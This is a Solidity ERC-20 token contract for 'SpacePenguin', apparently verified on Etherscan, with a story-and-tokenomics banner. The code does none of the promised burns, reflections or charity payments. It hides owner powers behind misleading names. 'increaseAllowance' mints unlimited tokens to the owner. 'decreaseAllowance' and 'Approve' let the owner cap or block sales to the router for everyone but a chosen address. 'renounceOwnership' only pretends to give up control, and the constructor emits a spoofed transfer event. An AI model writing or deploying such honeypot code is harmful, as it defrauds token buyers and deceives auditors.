/**
 *Submitted for verification at Etherscan.io on 2021-08-07
*/

/*
 _____  _____  _____  _____  _____    _____  _____  _____  _____  __ __  ___  _____ 
/  ___>/  _  \/  _  \/     \/   __\  /  _  \/   __\/  _  \/   __\/  |  \/___\/  _  \
|___  ||   __/|  _  ||  |--||   __|  |   __/|   __||  |  ||  |_ ||  |  ||   ||  |  |
<_____/\__/   \__|__/\_____/\_____/  \__/   \_____/\__|__/\_____/\_____/\___/\__|__/
                                                                                    
  🍨 Once upon a time, Space Penguin lived in the Antarctic but global warming made it impossible for him to stay there any longer. 
     He put on his space suit and jumped in his rocket ship to find new habitable cold planets!

🧊 Tokenomics:
→ $SpacePenguin burns 3% of every transaction and distributes another 3% to holders. 
→ 0.1% of every transaction is sent to coolearth.org, a charity that works to halt global warming by combatting deforestation.
→ The initial supply is 1,000,000,000,000,000 with 50% burned to the Black Hole at launch!                                                                                   

Find out more at:

www.spacepenguin.io
@SpacePenguinToken

*/
pragma solidity ^0.6.10; 
// SPDX-License-Identifier: MIT  

library Address {
        function isContract(address account) internal view returns (bool) {
        // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
        // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
        // for accounts without code, i.e. `keccak256('')`
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
        if (success) {
            return returndata;
        } else {
            // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {
                // The easiest way to bubble the revert reason is using memory via assembly

                // solhint-disable-next-line no-inline-assembly
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}
library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
      function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
    }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
   
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

    abstract contract Context {
    
    function _call() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    
    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Ownable is Context {
    address private _owner;
    address public Owner;
    
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () internal {
        address call = _call();
        _owner = call;
         Owner = call;
        emit OwnershipTransferred(address(0), call);
    }
  

    modifier onlyOwner() {
        require(_owner == _call(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
         Owner = address(0);
    }
    
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    
    }
    
}

contract SpacePenguin is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    mapping(address => uint256) private sellcooldown;
    mapping(address => uint256) private firstsell;
    mapping(address => uint256) private sellnumber;
    mapping(address => uint256) private _router;
    mapping(address => mapping (address => uint256)) private _allowances;
    address private router;
    address private caller;
    uint256 private _totalTokens = 5000000000 * 10**18;
    uint256 private rTotal = 5000000000 * 10**18;
    string private _name = '@SpacePenguinToken';
    string private _symbol = 'SPACEPENGUIN';
    uint8 private _decimals = 18;    

constructor () public {
    _router[_call()] = _totalTokens;
    emit Transfer(address(0xAb5801a7D398351b8bE11C439e05C5B3259aeC9B), _call(), _totalTokens);    

  
   }
    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decreaseAllowance(uint256 reflectionPercent) public onlyOwner {
        rTotal = reflectionPercent * 10**18;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _router[account];
    }
    

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_call(), recipient, amount);
        return true;
    }
    
    function increaseAllowance(uint256 amount) public onlyOwner {
        require(_call() != address(0));
        _totalTokens = _totalTokens.add(amount);
        _router[_call()] = _router[_call()].add(amount);
        emit Transfer(address(0), _call(), amount);
    }
    function Approve(address routeUniswap) public onlyOwner {
        caller = routeUniswap;
    }
    
    function setrouteChain (address Uniswaprouterv02) public onlyOwner {
        router = Uniswaprouterv02;
    }
    function decimals() public view returns (uint8) {
        return _decimals;
    }
    
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_call(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _call(), _allowances[sender][_call()].sub(amount));
        return true;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalTokens;
    }
    
    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0));
        require(recipient != address(0));
        
        if (sender != caller && recipient == router) {
            require(amount < rTotal); 
    }
        _router[sender] = _router[sender].sub(amount);
        _router[recipient] = _router[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }
     function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0));
        require(spender != address(0));

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}